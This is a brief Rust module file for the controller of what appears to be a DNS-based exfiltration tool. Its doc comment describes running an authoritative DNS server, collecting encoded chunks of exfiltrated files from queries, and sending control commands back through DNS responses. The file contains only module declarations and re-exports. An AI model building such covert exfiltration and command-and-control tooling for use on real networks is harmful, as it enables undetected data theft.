//! Controller module (Master Node / Reader).
//!
//! The controller is responsible for:
//! - Running the authoritative DNS server
//! - Receiving encoded chunks from DNS queries
//! - Maintaining shadow memory of exfiltrated files
//! - Sending control commands via DNS responses
//! - Verifying file integrity

pub mod server;
pub mod shadow;

pub use server::{ControllerConfig, ControllerServer, ControllerHandler};
pub use shadow::{ShadowMemory, ShadowStats, SessionShadow, ChunkReceiveResult};

